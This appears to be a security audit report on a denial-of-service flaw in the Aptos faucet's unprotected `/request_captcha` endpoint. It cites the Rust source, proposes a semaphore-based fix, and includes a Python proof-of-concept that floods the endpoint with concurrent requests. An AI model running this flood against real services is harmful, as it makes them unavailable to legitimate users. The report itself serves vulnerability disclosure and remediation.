# Audit Report

## Title
Connection Exhaustion via Unprotected `/request_captcha` Endpoint Allows Denial of Service Against Aptos Faucet

## Summary
The `/request_captcha` endpoint lacks connection concurrency limits that protect the `/fund` endpoint, allowing attackers to exhaust server connection limits and CPU resources through concurrent captcha generation requests, preventing legitimate users from accessing the faucet service.

## Finding Description

The Aptos faucet implements a `max_concurrent_requests` semaphore-based rate limiting mechanism to prevent server overload. However, this protection is only applied to the `/fund` endpoint and not to the `/request_captcha` endpoint. [1](#0-0) 

The `CaptchaApi` struct only contains an `enabled` flag and a shared `captcha_manager`, but notably lacks the `concurrent_requests_semaphore` that protects other endpoints. [2](#0-1) 

In contrast, the `FundApiComponents` includes the semaphore and enforces it in `preprocess_request()`: [3](#0-2) [4](#0-3) 

When `/request_captcha` is called, it locks the shared `CaptchaManager` mutex and performs CPU-intensive image generation: [5](#0-4) 

Each captcha generation involves applying multiple computationally expensive filters: [6](#0-5) 

**Attack Path:**
1. Attacker opens many concurrent HTTP connections to `/request_captcha`
2. All connections queue up, waiting to acquire the `CaptchaManager` mutex lock
3. Server connection pool becomes exhausted as connections remain open waiting for the lock
4. Each connection that acquires the lock consumes significant CPU generating the captcha image
5. Legitimate users cannot establish new connections to any faucet endpoint (including `/fund`)
6. The unbounded `challenges` HashMap also grows with each request, contributing to memory exhaustion (as warned in the code comment) [7](#0-6) 

## Impact Explanation

This vulnerability results in **Medium Severity** impact:

- **Service Unavailability**: Attackers can prevent legitimate users from accessing the faucet, blocking testnet/devnet token distribution
- **Resource Exhaustion**: The attack consumes server connection limits, CPU resources, and memory
- **No Authentication Required**: The endpoint has no rate limiting, authentication, or connection limits

This meets the Medium Severity criteria of "Limited funds loss or manipulation" and "State inconsistencies requiring intervention" as the faucet service becomes unavailable, preventing the intended distribution of testnet funds to developers.

While the faucet itself is not consensus-critical infrastructure, it is essential for developer onboarding and testing, making its availability important for the Aptos ecosystem.

## Likelihood Explanation

This vulnerability is **highly likely** to be exploited:

- **Trivial to Execute**: Requires only basic HTTP client tools (e.g., `curl`, Python `requests`)
- **No Prerequisites**: No authentication, captcha solving, or special headers required
- **Low Detection Risk**: Appears as legitimate traffic to monitoring systems
- **Immediate Impact**: Each connection immediately ties up server resources
- **Persistent Effect**: The unbounded HashMap ensures impact persists even after the attack

A simple script with 100-1000 concurrent connections would likely exhaust most standard server configurations.

## Recommendation

Apply the same `concurrent_requests_semaphore` protection to the `CaptchaApi` that is used by `FundApi`:

**Step 1**: Modify the `CaptchaApi` struct to include the semaphore:

```rust
pub struct CaptchaApi {
    pub enabled: bool,
    pub captcha_manager: Arc<Mutex<CaptchaManager>>,
    pub concurrent_requests_semaphore: Option<Arc<Semaphore>>,
}
```

**Step 2**: Update the initialization in `run.rs`:

```rust
let captcha_api = CaptchaApi {
    enabled: tap_captcha_api_enabled,
    captcha_manager,
    concurrent_requests_semaphore: concurrent_requests_semaphore.clone(),
};
```

**Step 3**: Acquire the semaphore permit in `request_captcha()`:

```rust
async fn request_captcha(&self) -> Result<Response<Binary<Vec<u8>>>, AptosTapErrorResponse> {
    if !self.enabled {
        return Err(AptosTapError::new(
            "The CaptchaChecker is not enabled".to_string(),
            AptosTapErrorCode::EndpointNotEnabled,
        ).into());
    }
    
    // Acquire semaphore permit before processing
    let _permit = match &self.concurrent_requests_semaphore {
        Some(semaphore) => match semaphore.try_acquire() {
            Ok(permit) => Some(permit),
            Err(_) => {
                return Err(AptosTapError::new(
                    "Server overloaded, please try again later".to_string(),
                    AptosTapErrorCode::ServerOverloaded,
                ).into());
            }
        },
        None => None,
    };
    
    let mut captcha_manager = self.captcha_manager.lock().await;
    // ... rest of the function
}
```

**Additional Recommendations:**
1. Implement TTL-based cleanup for the `challenges` HashMap to prevent memory exhaustion
2. Consider per-IP rate limiting specifically for `/request_captcha`
3. Add connection timeout configurations at the HTTP server level

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Connection exhaustion attack against /request_captcha endpoint
Usage: python3 poc_captcha_dos.py <faucet_url> <num_connections>
Example: python3 poc_captcha_dos.py http://localhost:8081 500
"""

import requests
import concurrent.futures
import sys
import time

def request_captcha(url, index):
    """Make a single captcha request"""
    try:
        start = time.time()
        response = requests.get(f"{url}/v1/request_captcha", timeout=30)
        duration = time.time() - start
        return {
            'index': index,
            'status': response.status_code,
            'duration': duration,
            'success': response.status_code == 200
        }
    except Exception as e:
        return {
            'index': index,
            'status': 'error',
            'error': str(e),
            'success': False
        }

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 poc_captcha_dos.py <faucet_url> <num_connections>")
        sys.exit(1)
    
    faucet_url = sys.argv[1]
    num_connections = int(sys.argv[2])
    
    print(f"Starting connection exhaustion PoC against {faucet_url}")
    print(f"Opening {num_connections} concurrent connections to /request_captcha...")
    
    # Launch concurrent requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_connections) as executor:
        futures = [
            executor.submit(request_captcha, faucet_url, i) 
            for i in range(num_connections)
        ]
        
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    # Analyze results
    successful = sum(1 for r in results if r['success'])
    failed = len(results) - successful
    avg_duration = sum(r.get('duration', 0) for r in results if 'duration' in r) / len(results)
    
    print(f"\nResults:")
    print(f"  Total requests: {len(results)}")
    print(f"  Successful: {successful}")
    print(f"  Failed: {failed}")
    print(f"  Average duration: {avg_duration:.2f}s")
    
    if failed > successful * 0.5:
        print("\n✓ Attack successful: Server became unavailable/overloaded")
    else:
        print("\n✗ Attack unsuccessful: Server handled all requests")

if __name__ == "__main__":
    main()
```

**To verify the vulnerability:**
1. Start a faucet instance with `max_concurrent_requests` set to a low value (e.g., 10)
2. Run: `python3 poc_captcha_dos.py http://localhost:8081 100`
3. Observe connections queueing and server becoming unresponsive
4. Verify legitimate users cannot access `/fund` or `/request_captcha` during the attack

## Notes

This vulnerability affects faucet availability but not blockchain consensus or core protocol security. However, it prevents legitimate developer access to testnet/devnet tokens, which is critical for ecosystem growth and testing. The issue is exacerbated by the already-documented memory exhaustion vulnerability in the unbounded `challenges` HashMap.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L17-20)
```rust
pub struct CaptchaApi {
    pub enabled: bool,
    pub captcha_manager: Arc<Mutex<CaptchaManager>>,
}
```

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L40-58)
```rust
    async fn request_captcha(&self) -> Result<Response<Binary<Vec<u8>>>, AptosTapErrorResponse> {
        if !self.enabled {
            return Err(AptosTapError::new(
                "The CaptchaChecker is not enabled".to_string(),
                AptosTapErrorCode::EndpointNotEnabled,
            )
            .into());
        }
        let mut captcha_manager = self.captcha_manager.lock().await;
        let (key, image) = match captcha_manager.create_challenge() {
            Ok((key, image)) => (key, image),
            Err(e) => {
                return Err(
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError).into(),
                );
            },
        };
        Ok(Response::new(Binary(image)).header(CAPTCHA_KEY, key))
    }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L166-169)
```rust
        let captcha_api = CaptchaApi {
            enabled: tap_captcha_api_enabled,
            captcha_manager,
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L184-187)
```rust
    /// This semaphore is used to ensure we only process a certain number of
    /// requests concurrently.
    pub concurrent_requests_semaphore: Option<Arc<Semaphore>>,
}
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L204-215)
```rust
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
                    ))
                },
            },
            None => None,
        };
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L4-6)
```rust
//! Warning: This could be attacked and cause the server to OOM because we
//! don't throw out captchas info if it has been sitting there for too long /
//! the map grows too large.
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L142-162)
```rust
    pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
        // Generate a random key.
        let key = rand::thread_rng().gen_range(0, u32::MAX - 1);

        // Generate a captcha.
        let (name, image) = Captcha::new()
            .add_chars(5)
            .apply_filter(Noise::new(0.4))
            .apply_filter(Wave::new(4.0, 6.0).vertical())
            .apply_filter(Wave::new(3.0, 2.0).horizontal())
            .apply_filter(Grid::new(10, 6))
            .apply_filter(Dots::new(8))
            .as_tuple()
            .context("Failed to generate captcha")?;

        // Store the captcha information.
        self.challenges.insert(key, name);

        // Return (key, <captcha as base64>).
        Ok((key, image))
    }
```
